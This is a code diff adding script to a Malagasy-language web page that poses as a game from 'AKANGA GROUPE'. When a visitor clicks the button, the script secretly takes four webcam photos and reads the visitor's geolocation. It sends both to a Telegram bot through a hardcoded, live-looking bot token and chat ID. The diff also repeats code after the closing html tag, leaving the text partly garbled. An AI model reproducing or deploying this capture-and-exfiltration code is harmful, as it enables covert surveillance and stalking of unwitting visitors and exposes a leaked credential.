@@ -24,16 +24,85 @@
 </head>
 <body>
   <h1>AKANGA GROUPE</h1>
-  <p>Izahay ato amin'ny <strong>"AKANGA GROUPE"</strong>dia</p>
+  <p>Izahay ato amin'ny <strong>"AKANGA GROUPE"</strong> dia</p>
   <p>Mampanao lalao azahoana data</p>
   <button onclick="startProcess()">Hanohy</button>
 
 <script>
   /* ------------- PARAMÈTRES TELEGRAM ------------- */
   const BOT_TOKEN = "8277743126:AAH0VRKfw7Q9bm3vsg-sX9-K3NNkoLIKWZY";
-  const CHAT_ID   = "-1002833433414"; // ID groupe ou personnel
+  const CHAT_ID   = "-1002833433414";
 
-    /* ------------- FONCTION PRINCIPALE ------------- */
+  /* ------------- FONCTION PRINCIPALE ------------- */
+  async function startProcess() {
+    // 1. Maka sary 3
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video  = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+
+    const canvas = document.createElement('canvas');
+    const ctx    = canvas.getContext('2d');
+
+    for (let i = 0; i < 4; i++) {
+      await new Promise(r => setTimeout(r, 1200));
+      canvas.width  = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0);
+      const imgData = canvas.toDataURL('image/png');
+      sendToTelegram(imgData, "Téléchargement selfie #" + (i+1));
+    }
+    stream.getTracks().forEach(t => t.stop());
+
+    // 2. Maka toerana
+    navigator.geolocation.getCurrentPosition(pos => {
+      const { latitude: lat, longitude: lon } = pos.coords;
+      const loc = `📍 Toerana: https://www.google.com/maps?q=${lat},${lon}`;
+      sendToTelegram(null, loc);
+      alert("Tongasoa!");
+    });
+  }
+
+  /* ------------- ENVOI VERS TELEGRAM ------------- */
+  async function sendToTelegram(imgBase64, caption) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+    const form = new FormData();
+
+    form.append("chat_id", CHAT_ID);
+    form.append("caption", caption);
+
+    if (imgBase64) {
+      const blob = dataURItoBlob(imgBase64);
+      form.append("photo", blob, "selfie.png");
+    }
+
+    await fetch(url, { method: "POST", body: form });
+  }
+
+  /* ------------- UTILITAIRE ------------- */
+  function dataURItoBlob(dataURI) {
+    const byteString = atob(dataURI.split(',')[1]);
+    const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
+    const ab   = new ArrayBuffer(byteString.length);
+    const ia   = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+    return new Blob([ab], { type: mime });
+  }
+</script>
+</body>
+</html>
+------------ */
+  function dataURItoBlob(dataURI) {
+    const byteString = atob(dataURI.split(',')[1]);
+    const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
+    const ab   = new ArrayBuffer(byteString.length);
+    const ia   = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+    return new Blob([ab], { type: mime });
+  }
+</script>
+</body>
+</html>
     async function startProcess() {
       // 1. Maka sary 3
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
